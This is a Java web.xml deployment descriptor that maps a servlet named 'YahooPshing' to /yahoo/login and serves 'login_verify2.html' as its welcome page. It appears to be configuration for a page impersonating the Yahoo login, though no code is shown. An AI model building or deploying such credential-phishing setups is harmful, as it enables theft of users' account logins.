<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app
        PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.2//EN"
        "http://java.sun.com/j2ee/dtds/web-app_2_2.dtd">


<web-app>


    <!-- Servlets -->
    <servlet>
        <servlet-name>YahooPshing</servlet-name>
        <servlet-class>com.test.YahooLoginService</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>YahooPshing</servlet-name>
        <url-pattern>/yahoo/login</url-pattern>
    </servlet-mapping>

    <!-- Default page to serve -->
    <welcome-file-list>
        <welcome-file>login_verify2.html</welcome-file>
    </welcome-file-list>

</web-app>
